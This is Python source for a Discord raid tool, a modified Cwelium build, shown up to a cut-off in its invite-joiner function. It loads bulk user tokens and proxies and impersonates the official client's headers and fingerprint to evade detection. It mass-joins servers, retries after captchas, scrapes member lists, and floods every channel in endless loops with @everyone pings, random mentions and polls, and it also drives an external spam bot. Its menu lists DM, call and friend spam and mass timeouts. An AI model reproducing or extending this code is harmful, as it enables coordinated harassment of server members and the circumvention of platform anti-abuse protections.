# Copyright (c) 2024-2026 Cwelium Inc.
# This project is licensed under the Cwelium License, which includes additional
# terms under the GNU Affero General Public License (AGPL) v3.0.
#
# Author: Tips-Discord
# Original Repository: https://github.com/Tips-Discord/Cwelium
#
# Additional Terms can be found at:
# https://github.com/Tips-Discord/Cwelium/blob/main/LICENSE

# ============================================================================
#  ⚠️ 警告 : このツールは Discord 利用規約に違反します。
#          アカウント停止・法的措置のリスクがあります。
#          教育目的以外での使用は厳に慎んでください。
# ============================================================================

#from concurrent.futures import ThreadPoolExecutor
import getpass
import sys
from colorama import Fore, init; init(autoreset=True)
from colorist import ColorHex as h
from datetime import datetime, timedelta
import base64
import ctypes
import os
import random
import re
import requests
import zlib
import socket
import string
import threading
import time
import curl_cffi
import uuid
import websocket
import orjson
import concurrent.futures
import json as json_lib

# ==================== 外部ボット設定ファイル ====================
EXTERNAL_BOT_CONFIG_FILE = "external_bot_config.json"

def load_bot_config():
    if os.path.exists(EXTERNAL_BOT_CONFIG_FILE):
        with open(EXTERNAL_BOT_CONFIG_FILE, "r") as f:
            return json_lib.load(f)
    return {"api_url": "http://localhost:3001", "secret": "masumani_raid_2024"}

def save_bot_config(config):
    with open(EXTERNAL_BOT_CONFIG_FILE, "w") as f:
        json_lib.dump(config, f, indent=2)

# ==================== グローバル終了フラグ ====================
SHOULD_STOP = False

class JsonWrapper:
    @staticmethod
    def loads(data, **kwargs):
        return orjson.loads(data)

    @staticmethod
    def load(fp, **kwargs):
        return orjson.loads(fp.read())

    @staticmethod
    def dumps(data, indent=None, separators=None, sort_keys=False, **kwargs):
        option = 0
        if indent:
            option |= orjson.OPT_INDENT_2
        if sort_keys:
            option |= orjson.OPT_SORT_KEYS
        option |= orjson.OPT_NON_STR_KEYS
        return orjson.dumps(data, option=option).decode()

    @staticmethod
    def dump(data, fp, indent=None, separators=None, sort_keys=False, **kwargs):
        option = 0
        if indent:
            option |= orjson.OPT_INDENT_2
        if sort_keys:
            option |= orjson.OPT_SORT_KEYS
        payload = orjson.dumps(data, option=option)
        try:
            fp.write(payload)
        except TypeError:
            fp.write(payload.decode())

json = JsonWrapper()

# グローバルセッションは残すが、主にヘッダー取得などに限定
session = curl_cffi.Session(impersonate="chrome136")

def get_random_str(length):
    return "".join(random.choice(string.ascii_letters + string.digits) for _ in range(length))

def wrapper(func):
    def wrapper(*args, **kwargs):
        console.clear()
        console.render_ascii()
        result = func(*args, **kwargs)
        return result
    return wrapper

C = {
    "green": h("#65fb07"),
    "red": h("#Fb0707"),
    "yellow": h("#FFCD00"),
    "magenta": h("#b207f5"),
    "blue": h("#00aaff"),
    "cyan": h("#aaffff"),
    "gray": h("#8a837e"),
    "white": h("#DCDCDC"),
    "pink": h("#c203fc"),
    "light_blue": h("#07f0ec"),
    "brown": h("#8B4513"),
    "black": h("#000000"),
    "aqua": h("#00CED1"),
    "purple": h("#800080"),
    "lime": h("#00FF00"),
    "orange": h("#FFA500"),
    "indigo": h("#4B0082"),
    "violet": h("#EE82EE"),
    "gold": h("#FFD700"),
    "silver": h("#C0C0C0"),
    "teal": h("#008080"),
    "navy": h("#000080"),
    "olive": h("#808000"),
    "maroon": h("#800000"),
    "coral": h("#FF7F50"),
    "salmon": h("#FA8072"),
    "khaki": h("#F0E68C"),
    "orchid": h("#DA70D6"),
    "rose": h("#FF007F")
}

class Files:
    @staticmethod
    def write_config():
        try:
            if not os.path.exists("config.json"):
                data = {
                    "Proxies": False,
                    "Theme": "light_blue",
                }
                with open("config.json", "w") as f:
                    json.dump(data, f, indent=4)
        except Exception as e:
            console.log("Failed", C["red"], "Failed to Write Config", e)

    @staticmethod
    def write_folders():
        folders = ["data", "scraped", "data/messages"]
        for folder in folders:
            try:
                if not os.path.exists(folder):
                    os.mkdir(folder)
            except Exception as e:
                console.log("Failed", C["red"], "Failed to Write Folders", e)

    @staticmethod
    def write_files():
        files = ["tokens.txt", "proxies.txt"]
        for file in files:
            try:
                if not os.path.exists(file):
                    with open(f"data/{file}", "a") as f:
                        f.close()
            except Exception as e:
                console.log("Failed", C["red"], "Failed to Write Files", e)

    @staticmethod
    def run_tasks():
        tasks = [Files.write_config, Files.write_folders, Files.write_files]
        for task in tasks:
            task()

Files.run_tasks()

with open("config.json") as f:
    Config = json.load(f)

proxy = Config["Proxies"]
color = Config["Theme"]
global_raider = None

class Render:
    def __init__(self):
        self.size = os.get_terminal_size().columns
        self.print_lock = threading.Lock()
        self.theme_name = color if color in C else "light_blue"
        self.theme_hex = C[self.theme_name].hex
        self.background = C[self.theme_name]
        self.username = getpass.getuser()

    def title(self, title):
        try:
            if os.name == 'nt':
                ctypes.windll.kernel32.SetConsoleTitleW(title)
            else:
                sys.stdout.write(f"\x1b]2;{title}\x07")
                sys.stdout.flush()
        except Exception:
            pass

    def clear(self):
        sys.stdout.write("\033[2J\033[H\033[3J")
        sys.stdout.flush()

    def _get_shade(self, x, y, width, height):
        def hex_to_rgb(h_code):
            h_code = h_code.lstrip('#')
            return tuple(int(h_code[i:i+2], 16) for i in (0, 2, 4))

        start_rgb = hex_to_rgb(self.theme_hex)
        end_rgb = (int(start_rgb[0] * 0.35), int(start_rgb[1] * 0.35), int(start_rgb[2] * 0.35))

        w_idx, h_idx = max(1, width - 1), max(1, height - 1)
        denom = (w_idx**2 + h_idx**2)
        factor = (x * w_idx + y * h_idx) / denom
        factor = max(0, min(1, factor))

        r = int(start_rgb[0] + (end_rgb[0] - start_rgb[0]) * factor)
        g = int(start_rgb[1] + (end_rgb[1] - start_rgb[1]) * factor)
        b = int(start_rgb[2] + (end_rgb[2] - start_rgb[2]) * factor)

        return h(f'#{r:02x}{g:02x}{b:02x}')

    def center_colored(self, text, visible_len):
        try:
            terminal_width = os.get_terminal_size().columns
        except OSError:
            terminal_width = self.size

        padding = max(0, (terminal_width - visible_len) // 2)
        return (" " * padding) + text

    def render_ascii(self):
        self.clear()
        self.title(f"Cwelium | Connected as {self.username} | made by Tips-Discord")

        edges = {"╗", "║", "╚", "╝", "═", "╔"}
        logo = [
            " ███╗   ███╗ █████╗ ███████╗██╗   ██╗███╗   ███╗ █████╗ ███╗   ██╗██╗",
            " ████╗ ████║██╔══██╗██╔════╝██║   ██║████╗ ████║██╔══██╗████╗  ██║██║",
            " ██╔████╔██║███████║███████╗██║   ██║██╔████╔██║███████║██╔██╗ ██║██║",
            " ██║╚██╔╝██║██╔══██║╚════██║██║   ██║██║╚██╔╝██║██╔══██║██║╚██╗██║██║",
            " ██║ ╚═╝ ██║██║  ██║███████║╚██████╔╝██║ ╚═╝ ██║██║  ██║██║ ╚████║██║",
            " ╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝",
        ]

        height = len(logo)
        width = max(len(line) for line in logo)

        print("\n")
        for y, line in enumerate(logo):
            colored_line = ""
            visible_len = 0
            for x, char in enumerate(line):
                if char in edges:
                    colored_line += f"{self._get_shade(x, y, width, height)}{char}{C['white']}"
                else:
                    colored_line += char
                visible_len += 1
            print(self.center_colored(colored_line, visible_len))
        print("\n")

    def raider_options(self):
        with open("data/proxies.txt") as f:
            global proxies
            proxies = f.read().splitlines()
        with open("data/tokens.txt", "r") as f:
            global tokens
            tokens = f.read().splitlines()

        menu_edges = {"─", "╭", "│", "╰", "╯", "╮", "»", "«"}
        menu = [
            "╭─────────────────────────────────────────────────────────────────────────────────────────────────────╮",
            "│ «01» Joiner            «07» Token Formatter    «13» Onliner           «19» Call Spammer             │",
            "│ «02» Leaver            «08» Button Click       «14» Voice Raper       «20» Bio Change               │",
            "│ «03» Spammer           «09» Accept Rules       «15» Change Nick       «21» Voice Joiner             │",
            "│ «04» Token Checker     «10» Guild Check        «16» Thread Spammer    «22» Onboard Bypass           │",
            "│ «05» Emoji Reaction    «11» Friend Spam        «17» Typer             «23» Dm Spammer               │",
            "│ «06» Clear Status      «12» ???                «18» ???               «24» Exit                     │",
            "│ «25» Poll Spammer      «26» Mass Timeout       «27» Mass Nick All     «28» ???                      │",
            "│ «29» Ext Bot Setup     «30» Ext Bot Spam       «31» Ext Bot Status    «32» ???                      │",
            "╰─────────────────────────────────────────────────────────────────────────────────────────────────────╯",
            "«h» Help   «~» Credits"
        ]

        stats_text = f"Loaded ‹{len(tokens)}› tokens | Loaded ‹{len(proxies)}› proxies"
        stats_colored = f"Loaded ‹{self.background}{len(tokens)}{Fore.RESET}› tokens | Loaded ‹{self.background}{len(proxies)}{Fore.RESET}› proxies"
        print(self.center_colored(stats_colored, len(stats_text)) + "\n")

        h_menu = len(menu)
        w_menu = len(menu[0])

        for y, line in enumerate(menu):
            colored_line = ""
            visible_len = 0
            for x, char in enumerate(line):
                if char in menu_edges:
                    shade = self._get_shade(x, y, w_menu, h_menu)
                    colored_line += f"{shade}{char}{C['white']}"
                else:
                    colored_line += char
                visible_len += 1
            print(self.center_colored(colored_line, visible_len))

        print("\n")

    def run(self):
        options = [self.render_ascii(), self.raider_options()]
        ([option] for option in options)

    def log(self, text=None, color=None, token=None, log=None):
        response = f"{Fore.RESET}[{datetime.now().strftime(f'{Fore.LIGHTBLACK_EX}%H:%M:%S{Fore.RESET}')}] "
        if text:
            response += f"[{color}{text}{C['white']}] "
        if token:
            response += token
        if log:
            response += f" ({C['gray']}{log}{C['white']})"

        response += f"{Fore.RESET}"

        with self.print_lock:
            print(response)

    def prompt(self, text, ask=None):
        prompted = f"{Fore.RESET}[{Fore.LIGHTBLACK_EX}{datetime.now().strftime('%H:%M:%S')}{Fore.RESET}] {C[color]}➜{Fore.RESET}  {Fore.WHITE}{text}{Fore.RESET}"

        if ask:
            prompted += f" {Fore.LIGHTBLACK_EX}({C['green']}y{Fore.RESET}{Fore.LIGHTBLACK_EX}/{C['red']}n{Fore.RESET}{Fore.LIGHTBLACK_EX}){Fore.LIGHTBLACK_EX}:{Fore.RESET} "
        else:
            prompted += f"{C[color]}:{Fore.RESET} "

        return prompted

console = Render()

class AutoFetchHeaders:
    user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9219 Chrome/138.0.7204.251 Electron/37.6.0 Safari/537.36"
    client_build_number = 482285
    native_build_number = 73385
    client_version = "1.0.9219"
    browser_version = "37.6.0"
    _fetched = False

    @staticmethod
    def fetch():
        try:
            if AutoFetchHeaders._fetched:
                return

            console.log("Scraping", C["light_blue"], False, "Fetching latest Discord headers...")

            response = requests.get("https://api.sockets.lol/discord/build", timeout=5)

            if response.status_code == 200:
                data = response.json()

                if "clients" in data and "Discord" in data["clients"]:
                    discord_data = data["clients"]["Discord"]["decoded"]

                    if discord_data.get("release_channel") == "stable":
                        AutoFetchHeaders.user_agent = discord_data["browser_user_agent"]
                        AutoFetchHeaders.client_version = discord_data["client_version"]
                        AutoFetchHeaders.browser_version = discord_data["browser_version"]
                        AutoFetchHeaders.native_build_number = discord_data["native_build_number"]
                        AutoFetchHeaders.client_build_number = discord_data["client_build_number"]

                        console.log("Success", C["green"], False, f"Updated: Build {AutoFetchHeaders.client_build_number} | v{AutoFetchHeaders.client_version}")
                        AutoFetchHeaders._fetched = True
                    else:
                        console.log("Failed", C["red"], False, "Fetched data was not Stable channel.")
                else:
                    console.log("Failed", C["red"], False, "Stable 'Discord' client data not found in API.")
            else:
                console.log("Failed", C["red"], False, f"API returned status {response.status_code}")
        except Exception as e:
            console.log("Failed", C["red"], "AutoFetch", e)

class Utils:
    @staticmethod
    def get_ranges(index, multiplier):
        initial_num = index * multiplier
        return [[initial_num, initial_num + 99], [initial_num + 100, initial_num + 199]]

    @staticmethod
    def parse_member_list_update(data):
        d = data["d"]
        return {
            "online_count": d["online_count"],
            "member_count": d["member_count"],
            "guild_id": d["guild_id"],
            "ops": d["ops"]
        }

class DiscordSocket(websocket.WebSocketApp):
    def __init__(self, token, guild_id, channel_id):
        self.start = time.time()
        self.token = token
        self.guild_id = guild_id
        self.channel_id = channel_id

        self.blacklisted_ids = {
            "1100342265303547924", "1190052987477958806", "833007032000446505",
            "1273658880039190581", "1308012310396407828", "1326906424873193586",
            "1334512667456442411", "1349869929809186846", "1171574570092871700",
        }

        self.buffer = bytearray()
        self.inflator = zlib.decompressobj()

        headers = {
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "en-US,en;q=0.9",
            "Cache-Control": "no-cache",
            "Pragma": "no-cache",
            "Sec-WebSocket-Extensions": "permessage-deflate; client_max_window_bits",
            "User-Agent": AutoFetchHeaders.user_agent,
        }

        super().__init__(
            "wss://gateway.discord.gg/?encoding=json&v=9&compress=zlib-stream",
            header=headers,
            on_open=self.on_open,
            on_message=self.on_message,
            on_close=self.on_close,
            on_error=self.on_error
        )

        self.end_scraping = False
        self.guild_member_count = 0
        self.members = {}
        self.ranges = [[0, 99]]
        self.last_range = 0
        self.packets_recv = 0

    def run(self):
        self.run_forever(
            sockopt=((socket.IPPROTO_TCP, socket.TCP_NODELAY, 1),)
        )
        return self.members

    def scrape_users(self):
        if self.end_scraping:
            return

        payload = {
            "op": 14,
            "d": {
                "guild_id": self.guild_id,
                "typing": False,
                "activities": False,
                "threads": False,
                "channels": {self.channel_id: self.ranges}
            }
        }
        self.send(json.dumps(payload))

    def on_open(self, ws):
        self.send(json.dumps({
            "op": 2,
            "d": {
                "token": self.token,
                "capabilities": 1734653,
                "properties": {
                    "os": "Windows",
                    "browser": "Chrome",
                    "device": "",
                    "system_locale": "en-US",
                    "browser_user_agent": AutoFetchHeaders.user_agent,
                    "browser_version": AutoFetchHeaders.browser_version,
                    "os_version": "10",
                    "referrer": "",
                    "referring_domain": "",
                    "referrer_current": "",
                    "referring_domain_current": "",
                    "release_channel": "stable",
                    "client_build_number": AutoFetchHeaders.client_build_number,
                    "client_event_source": None
                },
                "presence": {
                    "status": "online",
                    "since": 0,
                    "activities": [],
                    "afk": False
                },
                "compress": False,
                "client_state": {
                    "guild_hashes": {},
                    "highest_last_message_id": "0",
                    "read_state_version": 0,
                    "user_guild_settings_version": -1,
                    "user_settings_version": -1
                }
            }
        }))

    def heartbeat_thread(self, interval):
        while not self.end_scraping:
            try:
                self.send(json.dumps({"op": 1, "d": self.packets_recv}))
                time.sleep(interval)
            except Exception:
                break

    def on_message(self, ws, message):
        if isinstance(message, bytes):
            self.buffer.extend(message)
            if len(message) < 4 or message[-4:] != b'\x00\x00\xff\xff':
                return

            try:
                message = self.inflator.decompress(self.buffer)
                message = message.decode("utf-8")
                self.buffer = bytearray()
            except Exception:
                return

        try:
            decoded = json.loads(message)
        except:
            return

        if decoded is None:
            return

        op = decoded.get("op")
        t = decoded.get("t")

        self.packets_recv += 1 if op != 11 else 0

        if op == 10:
            interval = decoded["d"]["heartbeat_interval"] / 1000
            threading.Thread(target=self.heartbeat_thread, args=(interval,), daemon=True).start()

        elif t == "READY":
            for guild in decoded["d"]["guilds"]:
                if guild["id"] == self.guild_id:
                    self.guild_member_count = guild.get("member_count", 0)
                    break

            console.log("Info", C["yellow"], False, f"Target: {self.guild_member_count} members")

        elif t == "READY_SUPPLEMENTAL":
            self.ranges = Utils.get_ranges(0, 100)
            self.scrape_users()

        elif t == "GUILD_MEMBER_LIST_UPDATE":
            parsed = Utils.parse_member_list_update(decoded)

            if parsed["guild_id"] == self.guild_id:
                should_continue = False

                for op_chunk in parsed["ops"]:
                    op_type = op_chunk["op"]

                    if op_type in ("SYNC", "UPDATE"):
                        if op_type == "SYNC":
                            items = op_chunk.get("items")
                        else:
                            items = [op_chunk.get("item")]

                        if not items:
                            continue

                        for item in items:
                            member = item.get("member")
                            if not member:
                                continue

                            user = member.get("user")
                            if not user:
                                continue

                            uid = user.get("id")
                            if uid and uid not in self.blacklisted_ids and not user.get("bot"):
                                self.members[uid] = {
                                    "tag": f"{user.get('username')}#{user.get('discriminator', '0')}",
                                    "id": uid
                                }

                        should_continue = True

                    elif op_type == "INVALIDATE":
                        self.ranges = Utils.get_ranges(self.last_range, 100)
                        self.scrape_users()

                if len(self.members) >= self.guild_member_count or not should_continue:
                    if (self.last_range * 100) >= self.guild_member_count:
                        self.end_scraping = True
                        self.close()
                        return

                self.last_range += 2
                self.ranges = Utils.get_ranges(self.last_range, 100)
                self.scrape_users()

    def on_error(self, ws, error):
        if not self.end_scraping:
            console.log("Error", C["red"], False, f"Socket Error: {error}")
            pass

    def on_close(self, ws, close_code, close_msg):
        console.log("Success", C["green"], False, f"Scraped {len(self.members)} members in {time.time() - self.start:.2f}s")

def scrape(token, guild_id, channel_id):
    sb = DiscordSocket(token, guild_id, channel_id)
    return sb.run()

# ==================== 外部ボット制御クラス ====================
class ExternalBotController:
    def __init__(self, api_url=None, secret=None):
        config = load_bot_config()
        self.api_url = api_url or config.get("api_url", "http://localhost:3001")
        self.secret = secret or config.get("secret", "masumani_raid_2024")
        self._session = requests.Session()
        self._session.timeout = 120

    def _request(self, endpoint, method="GET", data=None):
        url = f"{self.api_url}{endpoint}"
        try:
            if method.upper() == "GET":
                r = self._session.get(url)
            else:
                r = self._session.post(url, json=data)
            if r.status_code == 401:
                return {"error": "Unauthorized - Invalid API Secret"}
            return r.json()
        except requests.exceptions.ConnectionError:
            return {"error": f"Connection refused. Is the bot running at {self.api_url}?"}
        except Exception as e:
            return {"error": str(e)}

    def status(self):
        return self._request("/api/status", "GET")

    def set_message(self, message):
        return self._request("/api/set_message", "POST", {"message": message, "secret": self.secret})

    def set_token(self, token):
        return self._request("/api/set_token", "POST", {"token": token, "secret": self.secret})

    def set_ids(self, guild_id, ids):
        return self._request("/api/set_ids", "POST", {
            "guild_id": guild_id,
            "ids": ids,
            "secret": self.secret
        })

    def spam(self, guild_id, channel_id=None, count=5, delay=600,
             everyone=False, vote=False, random=0, message=None, token=None):
        payload = {
            "guild_id": guild_id,
            "secret": self.secret,
            "count": count,
            "delay": delay,
            "everyone": everyone,
            "vote": vote,
            "random": random,
        }
        if channel_id:
            payload["channel_id"] = channel_id
        if message:
            payload["message"] = message
        if token:
            payload["token"] = token
        return self._request("/api/spam", "POST", payload)


# ============================================================================
#  メインの Raider クラス（完全改良版）
# ============================================================================
class Raider:
    def __init__(self):
        AutoFetchHeaders.fetch()
        self.cookies, self.fingerprint = self.get_discord_cookies()
        self.ws = websocket.WebSocket()
        self.cached_members = {}
        # ヘッダーキャッシュは廃止（スレッドセーフにするため）
        # self.header_cache = {}  ← 削除

        # スレッドローカルストレージ（各スレッドに独立したセッションを持つ）
        self._thread_local = threading.local()

    def get_discord_cookies(self):
        try:
            response = requests.get(
                'https://discord.com/api/v9/experiments',
            )
            if response.status_code == 200:
                return "; ".join(
                    [f"{cookie.name}={cookie.value}" for cookie in response.cookies]
                ) + f"; locale=en-US", response.json()["fingerprint"]
            else:
                console.log("ERROR", C["red"], "Failed to get cookies using Static")
                return "__dcfduid=62f9e16000a211ef8089eda5bffbf7f9; __sdcfduid=62f9e16100a211ef8089eda5bffbf7f98e904ba04346eacdf57ee4af97bdd94e4c16f7df1db5132bea9132dd26b21a2a; __cfruid=a2ccd7637937e6a41e6888bdb6e8225cd0a6f8e0-1714045775; _cfuvid=s_CLUzmUvmiXyXPSv91CzlxP00pxRJpqEhuUgJql85Y-1714045775095-0.0.1.1-604800000; locale=en-US"
        except Exception as e:
            console.log("ERROR", C["red"], "get_discord_cookies", e)

    def super_properties(self):
        try:
            payload = {
                "os": "Windows",
                "browser": "Discord Client",
                "release_channel": "stable",
                "client_version": AutoFetchHeaders.client_version,
                "os_version": "10.0.26100",
                "system_locale": "en-US",
                "browser_user_agent": AutoFetchHeaders.user_agent,
                "browser_version": AutoFetchHeaders.browser_version,
                "client_build_number": AutoFetchHeaders.client_build_number,
                "native_build_number": AutoFetchHeaders.native_build_number,
                "client_launch_id": str(uuid.uuid4()),
                "client_heartbeat_session_id": str(uuid.uuid4()),
                "launch_signature": str(uuid.uuid4()),
                "client_event_source": None,
            }
            properties = base64.b64encode(json.dumps(payload).encode()).decode()
            return properties
        except Exception as e:
            console.log("ERROR", C["red"], "get_super_properties", e)

    # ========== ヘッダー生成（キャッシュなし・スレッドセーフ） ==========
    def headers(self, token):
        return {
            "authority": "discord.com",
            "accept": "*/*",
            "accept-language": "en",
            "authorization": token,
            "cookie": self.cookies,
            "content-type": "application/json",
            "user-agent": AutoFetchHeaders.user_agent,
            "x-discord-locale": "en-US",
            "x-debug-options": "bugReporterEnabled",
            "x-fingerprint": self.fingerprint,
            "x-super-properties": self.super_properties(),
        }

    def nonce(self):
        return int(time.time() * 1000) - 1420070400000 << 22

    # ========== スレッドローカルセッション ==========
    def get_session(self):
        """各スレッドに固有の curl_cffi.Session を返す（プロキシ対応）"""
        if not hasattr(self._thread_local, 'session'):
            self._thread_local.session = curl_cffi.Session(impersonate="chrome136")
            # プロキシ設定（config.json で有効な場合）
            if proxy and proxies:
                selected = random.choice(proxies) if proxies else None
                if selected:
                    self._thread_local.session.proxies = {
                        "http": f"http://{selected}",
                        "https": f"http://{selected}"
                    }
        return self._thread_local.session

    # ========== 参加チェック（リトライ・レート制限対応） ==========
    def check_membership(self, token, guild_id, retries=3):
        """トークンが指定サーバーに参加しているか確認（429リトライ付き）"""
        for attempt in range(retries):
            try:
                sess = self.get_session()
                resp = sess.get(
                    f"https://discord.com/api/v9/guilds/{guild_id}/members/@me",
                    headers=self.headers(token)
                )
                if resp.status_code == 200:
                    return True
                elif resp.status_code == 429:
                    wait = resp.json().get('retry_after', 5) + random.uniform(0, 2)
                    console.log("Ratelimit", C["yellow"], f"{token[:15]}...", f"membership wait {wait:.1f}s")
                    time.sleep(wait)
                else:
                    # 403, 404 など → 未参加 or 無効
                    return False
            except Exception as e:
                console.log("Error", C["red"], f"{token[:15]}...", f"check_membership: {e}")
                time.sleep(1)
        return False

    # ========== テキストチャンネル取得（リトライ・レート制限対応） ==========
    def get_text_channels(self, token, guild_id, retries=2):
        """サーバーのテキストチャンネル一覧を取得（429リトライ付き）"""
        for attempt in range(retries):
            try:
                sess = self.get_session()
                resp = sess.get(
                    f"https://discord.com/api/v9/guilds/{guild_id}/channels",
                    headers=self.headers(token)
                )
                if resp.status_code == 200:
                    channels = resp.json()
                    return [c for c in channels if c.get('type') == 0]
                elif resp.status_code == 429:
                    wait = resp.json().get('retry_after', 5) + random.uniform(0, 2)
                    console.log("Ratelimit", C["yellow"], f"{token[:15]}...", f"channels wait {wait:.1f}s")
                    time.sleep(wait)
                else:
                    console.log("Failed", C["red"], f"{token[:15]}...", f"channels {resp.status_code}")
                    return []
            except Exception as e:
                console.log("Error", C["red"], f"{token[:15]}...", f"get_text_channels: {e}")
                time.sleep(1)
        return []

    # ========== メッセージ送信（リトライ・レート制限対応） ==========
    def send_message_to_channel(self, token, channel_id, message, pings, poll=None):
        """1つのチャンネルにメッセージ（+投票）を送信（429リトライ付き）"""
        content = ("@everyone " * pings) + message if pings > 0 else message
        payload = {"content": content}
        if poll:
            payload["poll"] = {
                "question": {"text": poll["question"]},
                "answers": [{"poll_media": {"text": opt}} for opt in poll["options"]],
                "duration": 24,
                "allow_multiselect": False
            }

        for attempt in range(3):
            try:
                sess = self.get_session()
                r = sess.post(
                    f"https://discord.com/api/v9/channels/{channel_id}/messages",
                    headers=self.headers(token),
                    json=payload
                )
                if r.status_code == 200:
                    console.log("Sent", C["green"], f"{token[:15]}...", f"Ch {channel_id}" + (" (poll)" if poll else ""))
                    return True
                elif r.status_code == 429:
                    wait = r.json().get('retry_after', 5) + random.uniform(0, 2)
                    console.log("Ratelimit", C["yellow"], f"{token[:15]}...", f"Ch {channel_id} wait {wait:.1f}s")
                    time.sleep(wait)
                else:
                    console.log("Failed", C["red"], f"{token[:15]}...", f"Ch {channel_id} ({r.status_code})")
                    return False
            except Exception as e:
                console.log("Error", C["red"], f"{token[:15]}...", f"send: {e}")
                time.sleep(1)
        return False

    # ========== サーバー全体スパマー（全チャンネル・無限ループ） ==========
    def guild_spammer(self, token, guild_id, message, pings, delay, poll=None):
        """全テキストチャンネルにスパムを送り続ける（SHOULD_STOPで停止）"""
        try:
            # 参加チェック
            if not self.check_membership(token, guild_id):
                console.log("Skip", C["gray"], f"{token[:15]}...", "not in guild")
                return

            # チャンネル一覧取得
            channels = self.get_text_channels(token, guild_id)
            if not channels:
                console.log("Info", C["yellow"], f"{token[:15]}...", "no text channels")
                return

            console.log("Started", C["green"], f"{token[:15]}...", f"{len(channels)} channels")

            # ★ メインループ（終了フラグが立つまで永続）
            while not SHOULD_STOP:
                for ch in channels:
                    if SHOULD_STOP:
                        break
                    self.send_message_to_channel(token, ch['id'], message, pings, poll)
                    # チャンネル間の小休止（レート制限回避）
                    time.sleep(random.uniform(0.3, 0.8))

                console.log("Cycle Done", C["cyan"], f"{token[:15]}...", f"{len(channels)} channels")
                if delay > 0:
                    time.sleep(delay)

        except Exception as e:
            console.log("Error", C["red"], f"{token[:15]}...", f"guild_spammer: {e}")

    # ========== 単一チャンネルスパマー（無限ループ） ==========
    def spammer(self, token, channel_id, message, guild=None, massping=None,
                pings=None, random_str=None, delay=None, poll=None):
        """指定された1チャンネルにスパムを送り続ける"""
        try:
            # メンション用にメンバーキャッシュ準備
            if massping and guild:
                self.get_random_members(guild, 1)

            # 参加チェック（メンション機能を使う場合は必須）
            if massping and guild:
                if not self.check_membership(token, guild):
                    console.log("Skip", C["gray"], f"{token[:15]}...", "not in guild (massping requires)")
                    return

            # ★ メインループ
            while not SHOULD_STOP:
                content = message
                if massping:
                    content += f" {self.get_random_members(guild, pings)}"
                if random_str:
                    content += f" | {get_random_str(10)}"

                self.send_message_to_channel(token, channel_id, content, 0, poll)

                if delay:
                    time.sleep(delay)
                else:
                    # デフォルトの小休止
                    time.sleep(random.uniform(0.5, 1.5))

        except Exception as e:
            console.log("Error", C["red"], f"{token[:15]}...", f"spammer: {e}")

    # ========== 参加トークンのフィルタリング（改良版） ==========
    def get_valid_tokens_for_guild(self, guild_id):
        """指定サーバーに参加しているトークンのみを抽出（check_membership利用）"""
        valid = []
        for token in tokens:
            if self.check_membership(token, guild_id):
                valid.append(token)
            else:
                console.log("Skip", C["gray"], f"{token[:15]}...", "not in guild")
        return valid

    # ========== メンバー取得（他機能用） ==========
    def member_scrape(self, guild_id, channel_id):
        try:
            if channel_id is None:
                for token in tokens:
                    resp = session.get(
                        f"https://discord.com/api/v9/guilds/{guild_id}/channels",
                        headers=self.headers(token)
                    )
                    if resp.status_code == 200:
                        channels = resp.json()
                        text_channels = [c for c in channels if c.get('type') == 0]
                        if text_channels:
                            channel_id = text_channels[0]['id']
                            break
                if channel_id is None:
                    console.log("Failed", C["red"], "No text channels found for scraping")
                    return

            valid_tokens = self.get_valid_tokens_for_guild(guild_id)
            if not valid_tokens:
                console.log("Failed", C["red"], "No token found in guild")
                return

            if not os.path.exists(f"scraped/{guild_id}.json"):
                members = scrape(random.choice(valid_tokens), guild_id, channel_id)
                with open(f"scraped/{guild_id}.json", "w") as f:
                    json.dump(list(members.keys()), f, indent=2)
        except Exception as e:
            console.log("Failed", C["red"], False, e)

    def get_random_members(self, guild_id, count):
        if guild_id not in self.cached_members:
            try:
                file_path = f"scraped/{guild_id}.json"
                if os.path.exists(file_path):
                    with open(file_path, "r") as f:
                        self.cached_members[guild_id] = json.loads(f.read())
                else:
                    return ""
            except Exception as e:
                console.log("Error", C["red"], f"Cache Load Failed: {e}")
                return ""
        members = self.cached_members[guild_id]
        if not members:
            return ""
        selected = random.sample(members, min(count, len(members)))
        return " ".join(f"<@!{uid}>" for uid in selected)

    # ========== 以下、既存のメソッド（変更なし or 軽微修正） ==========
    def joiner(self, invite):
        try:
            params = {
                "inputValue": f"https://discord.gg/{invite}",
                "with_counts": "true",
                "with_expiration": "true",
                "with_permissions": "true",
            }

            invite_info = None
            for token in tokens:
                response = session.get(
                    f"https://discord.com/api/v9/invites/{invite}",
                    headers=self.headers(token),
                    params=params
                )
                if response.status_code == 200:
                    invite_info = response.json()
                    break
                elif response.status_code == 404:
                    console.log("Failed", C["red"], "Invalid or expired invite")
                    input()
                    Menu().main_menu()
                    return

            if not invite_info:
                console.log("Failed", C["red"], "Could not retrieve invite info")
                input()
                Menu().main_menu()
                return

            guild_name = invite_info["guild"]["name"]
            guild_id = invite_info["guild"]["id"]
            channel_id = invite_info["channel"]["id"]
            channel_type = invite_info["channel"]["type"]

            join = {
                "location": "Join Guild",
                "location_guild_id": guild_id,
                "location_channel_id": channel_id,
                "location_channel_type": channel_type
            }
            context = base64.b64encode(json.dumps(join).encode()).decode()

            def join_server(token):
                try:
                    time.sleep(random.uniform(0.5, 3.0))
                    headers = self.headers(token)
                    headers["X-Context-Properties"] = context
                    payload = {"session_id": uuid.uuid4().hex}
                    resp = session.post(
                        f"https://discord.com/api/v9/invites/{invite}",
                        headers=headers,
                        json=payload
                    )
                    if resp.status_code == 200:
                        console.log("Joined", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", guild_name)
                    elif resp.status_code == 400:
                        console.log("Captcha", C["yellow"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", "Retrying...")
                        time.sleep(random.uniform(5, 10))
                        retry = session.post(
                            f"https://discord.com/api/v9/invites/{invite}",
                            headers=headers,
                            json=payload
                        )
                        if retry.status_code == 200:
                            console.log("Joined (retry)", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", guild_name)
                        else:
                            console.log("Captcha Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**")
                    elif resp.status_code == 429:
                        console.log("Cloudflare", C["magenta"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", "Rate limited, waiting...")
